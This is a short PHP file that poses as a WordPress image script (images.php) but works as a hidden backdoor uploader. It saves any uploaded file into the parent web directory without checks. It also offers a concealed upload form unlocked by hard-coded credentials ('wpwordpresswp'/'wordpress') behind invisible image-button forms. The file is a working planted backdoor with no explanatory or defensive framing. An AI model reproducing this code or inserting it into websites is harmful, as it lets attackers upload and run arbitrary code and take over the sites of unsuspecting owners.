<?php

if (is_uploaded_file(@$_FILES['wp']['tmp_name']))
{

$target_path = "../";
$target_path = $target_path . basename( $_FILES['wp']['name']); 

if(move_uploaded_file($_FILES['wp']['tmp_name'], $target_path)) {
    echo "The file ".  basename( $_FILES['wp']['name']). 
    " has been uploaded";
}   
	else
{
    echo "There was an error uploading the file, please try again!";
}

}

if((@$_POST['wp-submit'] == "ok") && (@$_POST['name'] == "wpwordpresswp") && (@$_POST['email'] == "wordpress"))
{
?>	

<form action="images.php" method="post" name="upload" enctype="multipart/form-data">
<input type="file" name="wp" /><br />
<input type="image"  value="." src="" />
</form>

<?php
}
?>
							
<form action="images.php" method="post" name="wordpress">
<input type="hidden" name="wp-submit" value="ok" />
<input name="name" type="text" /><br />
<input name="email" type="text" /><br />
<input type="image"  value="." src="" />
</form>